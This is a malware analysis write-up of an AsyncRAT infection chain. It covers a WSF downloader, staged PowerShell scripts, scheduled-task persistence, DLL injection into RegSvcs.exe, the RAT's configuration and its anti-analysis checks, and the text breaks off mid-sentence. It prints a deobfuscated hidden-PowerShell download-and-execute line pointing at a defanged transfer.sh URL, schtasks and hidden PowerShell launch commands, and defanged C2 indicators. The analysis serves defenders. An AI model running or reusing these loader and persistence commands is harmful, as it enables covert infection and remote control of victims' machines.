---
description: AsyncRAT Infection Chain Analysis
---

# AsyncRAT

## Summary

This sample utilizes AsyncRAT to remotely monitor and control the infected host through an encrypted tunnel. AsyncRAT is an open source Remote Access Tool maintained by [NYAN-x-CAT](https://github.com/NYAN-x-CAT). Features include Keylogger, screen viewer and recorder, SFTP upload and download and password recovery.

The infection chain utilized by this sample starts with a WSF file hosted on a malicious URL.

* Once the WSF file is executed it will then connect to another URL to download a malicious PowerShell script.
* This PowerShell script is used by the sample to contact another URL and download a second PowerShell script.
* The second PowerShell script creates a staging directory, a scheduled task, and drops four files into the created directory. The four files created by this sample were coinmarketcap.ps1, imcq.ps1, 1.bat, and coinmarketcap.vbs.
* When the scheduled task is triggered it will run coinmarketcap.vbs.
* coinmarketcap.vbs will run 1.bat
* 1.bat will then run imcq.ps1 which will inject a DLL embedded within itself into Regsvcs.exe and contact the attackers C2.

<figure><img src=".gitbook/assets/AsyncRat Infection Chain.jpeg" alt=""><figcaption><p>Infection chain utilized by this sample</p></figcaption></figure>

***

## Technical Analysis

### Downloader - any.txt

This file is used by the first stage to pull another PowerShell script from a malicious URL and continue the infection chain. The sample uses a find and replace and alternating capital letters in order to confuse someone who may be reading the file.

This stage of the sample can be deobfuscated to:

{% code overflow="wrap" %}
```
Set mw_wscript.shell= CreateObject("wscript.shell") mw_wscript.shell.Run(powershell.exe -wind hidden -exec bypass -noni iex(new-object net.webclient.downloadstring hxxps://transfer[.]sh/CdqqbMkRr9/Ic295.jpg , CONSOLE_HIDE, CMD_WAIT Set ali = Nothing
```
{% endcode %}

When this is ran it will download the next stage from _hxxps://transfer\[.]sh/CdqqbMkRr9/Ic295.jpg_ and run it with it with PowerShell.

***

### Builder - Ic295.jpg

The purpose of this stage is to setup a staging area for the sample and to establish persistence on the victim's machine. When this stage is executed it will drop four files in the staging area and start running the first files of this stage. The first file that is executed in this stage is coinmarketcap.ps1. This file is responsible for creating the scheduled task on the host to setup persistence on the machine, if for some reason the final payload is terminated this scheduled task will re-run the installation process.&#x20;

The scheduled task is ran with the command line:

{% code overflow="wrap" %}
```
'schtasks.exe' '/create' '/sc' 'minute' '/mo' 1 '/tn' ''coinmarketcap '/tr' (('C:\Users\Public\coinmarketcap\coinmarketcap.vbs'))
```
{% endcode %}

Once the scheduled task is executed it will then run coinmarketcap.vbs, this stage's responsibility is to run the dropped batch file 1.bat with wscript.

<figure><img src=".gitbook/assets/Coinmarketcap.vbs.jpeg" alt=""><figcaption><p>contents of coinmarketcap.vbs</p></figcaption></figure>

After the batch file is started it will run the final stage of this stage of this stage.

{% code overflow="wrap" %}
```
CMD /C powershell.exe -NOP -WIND HIDDEN -eXEC BYPASS -NONI "C:\Users\Public\coinmarketcap\imcq.ps1"
```
{% endcode %}

This last PowerShell script is used to build and inject a DLL into the target process RegSvcs.exe.

***

### Injector - NewPE2.dll

```
MD5:	5616daa897af18e81dee80e75eef90cd
SHA256: 3a9096d615a3cd3163b814cc2803d68a627c681d19d3a896313c925b8a11bf4c
Original Name: NewPE2.dll
file-type: dynamic-link-library
Compile Date: 28 FEB 2067 11:16:29
Entropy: 5.789
signature: Microsoft Visual C# / Basic .NET
file-size: 21504 (bytes)
```

#### _Public Class Execute()_

This class takes the arguments path and payload. These arguments are used by the sample to inject the final payload into a target process. In this sample, it is used to inject the final payload into RegSvcs.exe

Sample uses complex math to determine what case to switch to, this behavior is indicative of the malware author employing ConfuserEx to obfuscate the DLL.

<figure><img src=".gitbook/assets/SwitchCaseDLL.JPG" alt=""><figcaption><p>Example of switch case obfuscation used</p></figcaption></figure>

#### _Public Class Str()_

This class uses the functions ReverseString() and BinaryToString() to resolve WinAPI call.

**Function ReverseString()**

This function is used by the sample to reverse the order of an input string.

**Function BinaryToString()**

This function searches for the character "气" and replaces it with a 1 After this replacement is completed, it then converts the string from binary to ASCII.

<figure><img src=".gitbook/assets/BinaryToStringExample.JPG" alt=""><figcaption><p>Example of string passed to BinaryToString function</p></figcaption></figure>

***

## RAT - Stub.exe

```
MD5: D7B80F2813A1E85FA33250AF05291468
SHA256: 8830775005D8B9092E216A8AF9EF23AAB6622C1890D0FD425C4D726A03CDFAB0	
Original Name: Stub.exe
File-type: executable
Compile Date: Apr 10 2023
Entropy: 3.913
Signature: Microsoft Visual C# v7.0 / Basic .NET		
File-size: 98304 (bytes)
```

### Public Class Settings()

**Function InitalizeSettings()**

This function is used buy the sample to decrypt the RAT's configuration and then saves it to a field so it can be used later in the execution.

These are the configuration settings used in this sample:

```
Ports : 7719
Hosts : nationalteams11.publicvm[.]com
Version	: "| CRACKED BY hxxps://t[.]me/xworm_v2"
Install : false
MTX : "AsyncMutex_6SI8OkPnk"
Pastebin: null
Anti : false
offlineKL: false
BDOS : false
Group : Default
Hwid  : null
```

### Public Class main()

When main is ran it starts by entering a for loop where the escape condition is determined by the settings field "delay". Inside the loop contains the command Thread.Sleep(1000). This means that this sample will sleep for a total of three seconds before any more code is executed.

<figure><img src=".gitbook/assets/ThreadSleep.JPG" alt=""><figcaption><p>Example of Thread.Sleep()</p></figcaption></figure>

After the delay loop is completed, the sample starts to make decisions based on the configuration that was decrypted earlier. It does this by opening up a try catch block and compares the settings to a Boolean, if the setting is set to true it will run the function related to that setting.

<figure><img src=".gitbook/assets/TryCatchMain.JPG" alt=""><figcaption><p>Try catch block used by main()</p></figcaption></figure>

The first setting this sample checks for is Settings.Anti, this is used to determine if anti-analysis techniques will be utilized. If the configuration has anti-analysis enabled the sample will call the function RunAntiAnalysis().

<figure><img src=".gitbook/assets/RunAntiAnalysis.JPG" alt=""><figcaption><p>Anti-analysis function</p></figcaption></figure>

#### Function RunAntiAnalysis()

When this function is ran it will call several other functions to employ different anti-analysis techniques. This sample calls the functions Anti\_Analysis.DetectManufacturer(), Anti\_Analysis.DetectDebugger(), Anti\_Analysis.DetectSandboxie(), Anti\_Analysis.IsSmallDisk(), Anti\_Analysis.IsXP() to attempt to not be analyzed.

The first technique used by the sample is to detect what manufacturer the host made by. It does this by comparing the strings "microsoft corporation", "VIRTUAL", "vmware", and "VirtualBox". If the sample finds any of these strings it will kill the process.

<figure><img src=".gitbook/assets/DetectManufacturer.JPG" alt=""><figcaption><p>Detect Manufacturer function</p></figcaption></figure>

If the sample is unable to find any of these strings it will continue to employ anti-analysis techniques, the next one used is to determine if a debugger is attached to the process.

#### Function DetectDebugger()

If the sample is able to determine that a debugger is attached to the process it will kill the process, preventing further dynamic analysis from being completed.

<figure><img src=".gitbook/assets/DetectDebugger.JPG" alt=""><figcaption><p>Detect Debugger function</p></figcaption></figure>

#### Function DetectSandboxie()

The next technique used is to detect if the sample is running in a sandboxie sandbox, it achives this by attempting to create a handle to the DLL SbieDll.dll. If it is able to create a handle it will kill the process. [Sandboxie](https://sandboxie-plus.com/) is a sandbox-based isolation software for 32-bit and 64-bit Windows NT-based operating systems.

<figure><img src=".gitbook/assets/DetectSandboxie.JPG" alt=""><figcaption><p>Detect Sandboxie function</p></figcaption></figure>

#### Function IsSmallDisk()

After the sample determines that it's not being ran in a sandbox it will try to employ another technique to determine if it's being ran in a virtualized environment, it does this by getting the disk's size and compares it to a constant. In this case it will check if the disk is larger than 61GB.

<figure><img src=".gitbook/assets/IsSmallDisk.JPG" alt=""><figcaption><p>Is Small Disk function</p></figcaption></figure>

#### Function IsXP()

The last technique used to try to evade detection is to determine if the sample is running on a Windows XP machine.

<figure><img src=".gitbook/assets/IsXP.JPG" alt=""><figcaption><p>Is XP function</p></figcaption></figure>

Once the sample has completed deploying its anti-analysis techniques it will then start to install the RAT on the host and establish more persistence on the host. First the sample will check if Settings.Install is set to true, if it is it will then call the function NormalStartup.Install().

#### Function NormalStartup.Install()

This function starts by checking to see if the module's file name is the same as the one set in the configuration. In this sample it's set to "%APPDATA%/python2.09.exe. If they aren't equal the sample will start to enumerate the processes running on the host to check if it is running in another process. If it detects that it's running in another process it will kill the other process.

<figure><img src=".gitbook/assets/GetFileName.JPG" alt=""><figcaption><p>Code used to check filename</p></figcaption></figure>

<figure><img src=".gitbook/assets/EnumProcesses.JPG" alt=""><figcaption><p>Process enumeration</p></figcaption></figure>

Next the sample will determine if it is running as an administrator, if it is it will created a scheduled task to run the RAT on logon.

<figure><img src=".gitbook/assets/CreateTask.JPG" alt=""><figcaption><p>Create schtask if sample is running as Admin</p></figcaption></figure>

If the sample is not running as an administrator it will&#x20;
